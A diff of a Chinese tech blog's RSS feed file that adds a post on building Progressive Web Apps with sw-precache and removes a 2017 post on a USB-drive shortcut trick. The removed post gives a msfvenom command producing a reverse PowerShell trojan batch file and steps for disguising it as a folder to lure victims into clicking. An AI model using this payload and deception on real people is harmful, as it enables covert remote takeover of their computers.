@@ -8,7 +8,22 @@
         <atom:link href="http://www.vinny.cc/feed.xml" rel="self" type="application/rss+xml" />  
           
             <item>  
-               <title>Progressive Web App 汇总使用说明</title>  
+               <title>使用 sw-precache 构建 Progressive Web App</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#1-pwa是什么&quot; id=&quot;markdown-toc-1-pwa是什么&quot;&gt;1. PWA是什么&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;1-pwa是什么&quot;&gt;1. PWA是什么&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Progressive Web App&lt;/strong&gt;，简称 &lt;strong&gt;pwa&lt;/strong&gt;，中文名称为 &lt;em&gt;渐进式网页应用&lt;/em&gt;。它的目的是利用web的技术给移动端的设备提供原生App的体验。&lt;/p&gt;
+
+</description>  
+               <pubDate>Sat, 12 May 2018 00:00:00 +0800</pubDate>  
+               <link>http://www.vinny.cc/2018/05/pwa-sw-precache/</link>  
+               <guid isPermaLink="true">http://www.vinny.cc/2018/05/pwa-sw-precache/</guid>  
+               </item>  
+          
+            <item>  
+               <title>什么是 Progressive Web App 及其使用</title>  
                <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#1-pwa是什么&quot; id=&quot;markdown-toc-1-pwa是什么&quot;&gt;1. PWA是什么&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#2-有什么特性&quot; id=&quot;markdown-toc-2-有什么特性&quot;&gt;2. 有什么特性&lt;/a&gt;&lt;/li&gt;
@@ -1901,39 +1916,6 @@ msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&qu
                <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
                <link>http://www.vinny.cc/2017/11/u-link-remote-vulnerability/</link>  
                <guid isPermaLink="true">http://www.vinny.cc/2017/11/u-link-remote-vulnerability/</guid>  
-               </item>  
-          
-            <item>  
-               <title>U盘伪装快捷方式欺骗攻击</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#1-生成脚本木马&quot; id=&quot;markdown-toc-1-生成脚本木马&quot;&gt;1. 生成脚本木马&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#2-u盘放置木马&quot; id=&quot;markdown-toc-2-u盘放置木马&quot;&gt;2. U盘放置木马&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#3-伪装隐藏&quot; id=&quot;markdown-toc-3-伪装隐藏&quot;&gt;3. 伪装隐藏&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#4-诱骗点击&quot; id=&quot;markdown-toc-4-诱骗点击&quot;&gt;4. 诱骗点击&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;1-生成脚本木马&quot;&gt;1. 生成脚本木马&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p cmd/windows/reverse_powershell &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.1.15 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;43221  &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file.bat
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;2-u盘放置木马&quot;&gt;2. U盘放置木马&lt;/h2&gt;
-
-&lt;p&gt;在U盘创建一个空文件夹，将木马程序放到文件夹中，并对此木马程序创建快捷方式，将快捷方式剪切到此文件夹之外。&lt;/p&gt;
-
-&lt;h2 id=&quot;3-伪装隐藏&quot;&gt;3. 伪装隐藏&lt;/h2&gt;
-
-&lt;p&gt;将快捷方式图标设置为文件夹的方式，重命名，如”18++”&lt;/p&gt;
-
-&lt;p&gt;第一步创建的文件夹设置为隐藏模式&lt;/p&gt;
-
-&lt;h2 id=&quot;4-诱骗点击&quot;&gt;4. 诱骗点击&lt;/h2&gt;
-
-&lt;p&gt;此时U盘中只会看见一个”18++”的”文件夹”，其实是伪装的脚本木马程序。&lt;/p&gt;
-</description>  
-               <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/u-fake-attacker/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/u-fake-attacker/</guid>  
                </item>  
           
     </channel>  
